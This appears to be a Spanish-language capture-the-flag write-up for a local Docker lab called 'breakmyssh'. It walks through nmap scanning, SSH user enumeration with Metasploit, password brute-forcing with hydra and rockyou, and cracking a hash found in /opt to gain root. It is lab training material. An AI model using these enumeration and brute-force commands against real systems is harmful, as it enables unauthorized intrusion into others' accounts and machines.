
**1. El primer paso será desempaquetar el archivo tar y el autodeploy.**
```bash
unzip breakmyssh.zip 
```

<img width="715" height="183" alt="image" src="https://github.com/user-attachments/assets/58f71e18-bbd6-444a-8dcd-6bf2c841093c" />

**2. Ahora encenderemos la máquina**
```bash
 sudo bash ./auto_deploy.sh breakmyssh.tar 
```
<img width="964" height="205" alt="image" src="https://github.com/user-attachments/assets/4d472b33-9eba-4812-a706-a9f7e9470d5c" />

**3.Comprobaremos la conexión mediante un ping.**
```bash
ping -c3 172.17.0.2
```

<img width="956" height="349" alt="image" src="https://github.com/user-attachments/assets/767b3c0d-c3b6-473e-829f-d39830c1b929" />


**4. Realizaremos un rastreo de puertos mediante nmap.**

```bash
 nmap -sCV 172.17.0.2
```

<img width="937" height="305" alt="image" src="https://github.com/user-attachments/assets/2105b392-60be-409d-a0e5-8a60a8614f7b" />

**5. Ahora entraremos a la consola de metasploit para poder enumerar usuario**
```bash
msfconsole
```

<img width="959" height="470" alt="image" src="https://github.com/user-attachments/assets/5713accd-aaf7-43a1-8c68-0415b5f5b798" />


**5.1 Dentro de la consola escribiremos un script para encontrar un usuario, **

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 172.17.0.2
set USER_FILE /usr/share/wordlists/rockyou.txt
set CHECK_FALSE true
run
```

<img width="965" height="361" alt="image" src="https://github.com/user-attachments/assets/10dc62c4-628c-4293-a581-1297e7245115" />

**6. Ya conociendo nuestro usuario podremos entrar a la máquina mediante fuerza bruta con el protocolo hydra.**
```bash
 hydra -l lovely -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 64 ssh
```

<img width="964" height="374" alt="image" src="https://github.com/user-attachments/assets/3d3ad986-6a6b-4b95-b61d-a3acb04dc08a" />

**7. Ahora procederemos a hacer ssh para poder entrar a la terminal mediante remoto.**
```bash
 ssh lovely@172.17.0.2
# passw: rockyou
```

<img width="956" height="443" alt="image" src="https://github.com/user-attachments/assets/5be11071-3fdb-4cdb-a9b0-e9110ba226fa" />


**8. Ahora pasaremos a la esala de privilegios, para ello primero miraremos con `sudo -l` los binarios con permisos, no tenemos. Asi que iremos a /opt/**
```bash
cd /opt/ 
 ls -la         
```

<img width="949" height="165" alt="image" src="https://github.com/user-attachments/assets/29a53a42-b0a4-4673-aeb9-70eecbea8323" />


**8.1Veremos un archivo de testo .hash y procederemos a leerlo**
```bash
 cat .hash 
```

<img width="945" height="68" alt="image" src="https://github.com/user-attachments/assets/1e97b12b-fb58-49f6-9622-04003079e171" />

**8.2 Ahora visitaremos CrackStation para poder crackear el hash.**


<img width="964" height="1024" alt="image" src="https://github.com/user-attachments/assets/f1732677-da10-4682-b865-24eaa56703b6" />


**8.3 Teniendo ya la contraseña procederemos a entrar a root**
```bash
sudo su
# passwd: estrella
```

<img width="732" height="106" alt="image" src="https://github.com/user-attachments/assets/dbd99ce8-d1ca-4591-bb5a-2742466a4bcd" />


